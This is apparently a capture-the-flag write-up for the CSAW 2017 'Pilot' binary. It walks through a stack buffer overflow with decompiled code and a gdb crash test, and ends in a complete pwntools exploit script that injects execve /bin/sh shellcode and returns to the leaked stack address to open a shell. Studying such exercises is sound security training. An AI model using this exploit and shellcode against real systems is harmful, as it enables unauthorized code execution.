
# Pilot

Program leaks a stack address, then asks for a takes input.

```shell
./pilot

[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffe29119e60
[*]Command:
[*]There are no commands....
[*]Mission Failed....
```

Source code, program `read()`s **64** bytes into a **32** byte buffer, allowing for overflow into the return address. 

```c
undefined8 main(void)

{
  ostream *output;
  ssize_t sVar1;
  undefined8 uVar2;
  undefined1 input [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  output = std::operator<<((ostream *)std::cout,"[*]Welcome DropShip Pilot...");
  std::ostream::operator<<(output,std::endl<>);
  output = std::operator<<((ostream *)std::cout,"[*]I am your assitant A.I....");
  std::ostream::operator<<(output,std::endl<>);
  output = std::operator<<((ostream *)std::cout,"[*]I will be guiding you through the tutorial....")
  ;
  std::ostream::operator<<(output,std::endl<>);
  output = std::operator<<((ostream *)std::cout,
                           "[*]As a first step, lets learn how to land at the designated location... ."
                          );
  std::ostream::operator<<(output,std::endl<>);
  output = std::operator<<((ostream *)std::cout,
                           "[*]Your mission is to lead the dropship to the right location and execut e sequence of instructions to save Marines & Medics..."
                          );
  std::ostream::operator<<(output,std::endl<>);
  output = std::operator<<((ostream *)std::cout,"[*]Good Luck Pilot!....");
  std::ostream::operator<<(output,std::endl<>);
  output = std::operator<<((ostream *)std::cout,"[*]Location:");
  output = (ostream *)std::ostream::operator<<(output,input);
  std::ostream::operator<<(output,std::endl<>);
  std::operator<<((ostream *)std::cout,"[*]Command:");
  sVar1 = read(0,input,64);
  if (sVar1 < 5) {
    output = std::operator<<((ostream *)std::cout,"[*]There are no commands....");
    std::ostream::operator<<(output,std::endl<>);
    output = std::operator<<((ostream *)std::cout,"[*]Mission Failed....");
    std::ostream::operator<<(output,std::endl<>);
    uVar2 = 0xffffffff;
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}
```

Taking a look at the stack, the input is at an offset of **-0x28** (**40**) 

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined8        RAX:8          output                                  XREF[1]:     004009f4(W)  
             undefined1[32]    Stack[-0x28]   input                                   XREF[2]:     00400aa4(*), 
                                                                                                   00400acf(*)  
                             main                                            XREF[3]:     entry:004008cd(*), 00400de0, 
                                                                                          00400e80(*)  

```

This can be confirmed by inputting **40** bytes of padding + `0xdeadbeef`. The program crashes because it attempts to return to `0xdeadbeef` which is not a valid address.

```
run < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A" * 40 + pwn.p64(0xdeadbeef))')

Starting program: /home/wither/NOTES/CSAW/2017/Pilot/pilot < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A" * 40 + pwn.p64(0xdeadbeef))')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fffffffdc50
[*]Command:
Program received signal SIGSEGV, Segmentation fault.
0x00000000deadbeef in ?? ()
...
Invalid address 0xdeadbeef
```

Put this into a python exploit, using shellcode from https://www.exploit-db.com/exploits/46907. I tried using shellcraft, but the shellcode was too big to fit into the **40** bytes.

```python
#!/usr/bin/python3

# import pwntools
from pwn import *
# import re for regex
from re import *

# only show errors
context.log_level = 'ERROR'

# start the binary process
context.binary = ELF("./pilot", checksec=False)
p = process()

# grab the stack address leaked by the program
line = (p.recvuntil(b"Command:")).decode()
leaked_addr = int(search(r'0x[\da-f]+', line).group(), 16)

# 23B execve /bin/sh shellcode from https://www.exploit-db.com/exploits/46907
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# add the shellcode + padding to fill 40B buffer + address of shellcode to return to and execute
payload = shellcode + b"A" * (40 - len(shellcode)) + p64(leaked_addr)

# send the payload and enter interactive mode for the shell
p.sendline(payload)
p.interactive()

```

Get a shell

```
python3 exploit.py

$ ls
README.md  exploit.py  pilot
```